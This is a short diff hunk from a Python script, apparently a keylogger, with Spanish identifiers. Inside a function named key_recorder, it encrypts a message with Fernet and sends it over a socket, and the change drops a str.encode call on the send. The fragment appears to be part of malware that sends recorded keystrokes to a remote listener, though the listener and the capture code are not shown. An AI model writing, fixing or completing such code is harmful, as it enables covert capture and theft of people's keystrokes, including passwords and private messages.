@@ -14,7 +14,7 @@ def key_recorder(key):
 	f = Fernet(clave)
 	print(clave)
 	mensajeencriptado = f.encrypt(mensaje)
-	mi_socket.send(str.encode(mensajeencriptado))
+	mi_socket.send((mensajeencriptado))
 	mi_socket.close()
 	print(key)
 
